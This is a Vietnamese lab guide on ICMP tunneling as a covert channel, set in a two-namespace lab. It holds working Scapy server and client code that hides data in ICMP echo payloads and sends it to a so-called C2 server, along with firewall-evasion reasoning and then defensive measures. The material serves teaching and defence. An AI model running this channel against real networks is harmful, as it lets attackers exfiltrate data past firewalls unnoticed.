# HƯỚNG DẪN TRIỂN KHAI & PHÂN TÍCH KỸ THUẬT: LAB 03
## Kỹ Thuật Tạo Kênh Ngầm ICMP Tunneling (Covert Channel & Data Exfiltration)

---

### 1. Kiến Trúc Mạng & Mục Đích Từng Bước Triển Khai

Thực nghiệm mô phỏng tình huống tấn công thực tế trong doanh nghiệp:
- **Client nội bộ (`h1` - `10.0.0.1`):** Nằm trong mạng LAN nội bộ, bị tường lửa hạn chế gắt gao các kết nối TCP ra ngoài.
- **Server bên ngoài (`h2` - `10.0.0.2`):** Máy chủ điều khiển (C2 Server) của kẻ tấn công đóng vai trò làm điểm tiếp nhận dữ liệu bị đánh cắp.

```
[ Namespace h1 (Client Nội Bộ) ]                 [ Namespace h2 (C2 Server Ngoài) ]
+------------------------------+                 +--------------------------------+
| IP: 10.0.0.1/24              |                 | IP: 10.0.0.2/24                |
| Data Source: /etc/hostname   | == ICMP Link => | Script: icmp_server.py         |
| Script: icmp_client.py       |                 | Firewall: iptables DROP TCP    |
+------------------------------+                 +--------------------------------+
```

#### Phân Tích Cấu Hình Kernel `icmp_echo_ignore_all`:
```bash
ip netns exec h2 sysctl -w net.ipv4.icmp_echo_ignore_all=1
```
- **Vai trò bắt buộc:** 
  - Khi một máy tính Linux nhận được gói ICMP Echo Request (Type 8), theo mặc định ngăn xếp mạng trong nhân hệ điều hành (Kernel IP Stack) sẽ tự động tạo và gửi ngay lập tức một gói ICMP Echo Reply (Type 0) trả lại cho người gửi.
  - Nếu kịch bản Scapy `icmp_server.py` đang chạy ở tầng user-space cũng đồng thời xử lý và gửi phản hồi `ACK:data`, client sẽ nhận được **hai gói tin phản hồi** cạnh tranh nhau (một từ kernel mang payload gốc, một từ Scapy mang payload ACK).
  - Việc thiết lập `icmp_echo_ignore_all = 1` giúp triệt tiêu hoàn toàn phản hồi tự động của kernel, nhường toàn quyền kiểm soát kênh ICMP cho tiến trình Scapy ở không gian người dùng.

---

### 2. Giải Mã Kỹ Thuật Mã Nguồn Scapy

#### 2.1 Mã Nguồn Máy Chủ (`icmp_server.py`)
```python
def handle(p):
    if p.haslayer(ICMP) and p[ICMP].type == 8:
        data = bytes(p[ICMP].payload)
        print(f"[server] nhan ({len(data)} bytes): {data}", flush=True)
        reply = IP(dst=p[IP].src) / ICMP(type=0, id=p[ICMP].id, seq=p[ICMP].seq) / (b"ACK:" + data)
        send(reply, verbose=0)

sniff(iface="veth2", filter="icmp", prn=handle)
```
- `filter="icmp"`: Bộ lọc BPF ở tầng kernel giúp giảm tải CPU, chỉ chuyển tiếp các gói tin ICMP lên ứng dụng Python.
- `p[ICMP].type == 8`: Chỉ xử lý các yêu cầu Echo Request từ client.
- `bytes(p[ICMP].payload)`: Trích xuất toàn bộ dữ liệu bí mật được kẻ tấn công giấu sau tiêu đề 8 bytes của ICMP.
- `b"ACK:" + data`: Đóng gói giao thức điều khiển tầng ứng dụng (Custom Application Protocol) ngay trên nền ICMP Echo Reply để báo cho client biết server đã nhận toàn vẹn khối dữ liệu.

#### 2.2 Mã Nguồn Máy Khách (`icmp_client.py`)
```python
total_chunks = (len(data) + chunk - 1) // chunk
for i in range(0, len(data), chunk):
    seg = data[i:i+chunk]
    seq_num = i // chunk
    ans = sr1(IP(dst=target) / ICMP(type=8, id=0x1337, seq=seq_num) / seg, timeout=2, verbose=0)
```
- `chunk = 24`: Phân mảnh dữ liệu thành các khối nhỏ vừa vặn với kích thước ping thông thường để ngụy trang, tránh bị hệ thống giám sát cảnh báo vì gói tin kích thước quá lớn.
- `id=0x1337`: Sử dụng trường `Identifier` làm Session ID để định danh phiên truyền dữ liệu ngầm.
- `seq=seq_num`: Sử dụng trường `Sequence Number` để bảo đảm thứ tự tái ghép nối dữ liệu tại phía máy chủ nếu truyền các tệp tin lớn.
- `sr1(..., timeout=2)`: Gửi gói tin và chờ gói ACK phản hồi trong vòng 2 giây, tạo cơ chế truyền tải tin cậy (Reliable Transmission) tương tự như TCP nhưng hoạt động hoàn toàn trên ICMP.

---

### 3. Cơ Chế Vượt Tường Lửa Tầng 4 & Phòng Thủ Đa Lớp

#### 3.1 Vì Sao Tường Lửa Tầng 4 Bị Đánh Bại?
- Hầu hết các chính sách an ninh mạng doanh nghiệp truyền thống tập trung kiểm soát tại Tầng Giao Vận (Layer 4) bằng các cổng TCP/UDP:
  - Cho phép Web (Port 80, 443).
  - Chặn các cổng nguy hiểm (SSH 22, Telnet 23, File Sharing 445, Custom Port 9000).
- Tuy nhiên, lệnh `ping` (ICMP Type 8) thường được mở cho toàn bộ nhân viên để kiểm tra kết nối mạng nội bộ và Internet.
- Do ICMP hoạt động ở Layer 3 và không có trường Port, quy tắc `iptables -A INPUT -p tcp -j DROP` hoàn toàn bỏ qua lưu lượng ICMP, tạo ra một "lỗ hổng kiến trúc" cho phép kẻ tấn công thiết lập kênh ngầm (Covert Channel) đưa dữ liệu bí mật ra ngoài mà không bị tường lửa ngăn chặn.

#### 3.2 Giải Pháp Phòng Thủ Thực Tiễn
1. **Kiểm Soát Biên Mạng (Egress Filtering):**
   - Chặn tuyệt đối lưu lượng ICMP Echo Request đi ra ngoài Internet từ các máy trạm người dùng. Chỉ cho phép ping từ các máy chủ giám sát mạng chuyên dụng.
2. **Triển Khai Tường Lửa Thế Hệ Mới (NGFW) & DPI:**
   - Sử dụng công nghệ Deep Packet Inspection (DPI) để giải mã trường tải trọng của gói ICMP. Nếu payload chứa chuỗi ký tự ASCII, dữ liệu nhị phân hoặc không khớp với mẫu đệm tiêu chuẩn của hệ điều hành $\implies$ Hủy gói tin ngay lập tức.
3. **Phân Tích Dị Thường Thống Kê & Băng Thông (Rate Limiting):**
   - Áp dụng chính sách bóp băng thông ICMP trên router/switch: Giới hạn tối đa 1 gói/giây cho mỗi host. Kẻ tấn công sẽ mất hàng tuần để tuồn ra một tài liệu dung lượng vài Megabytes, làm mất đi tính khả thi của cuộc tấn công.

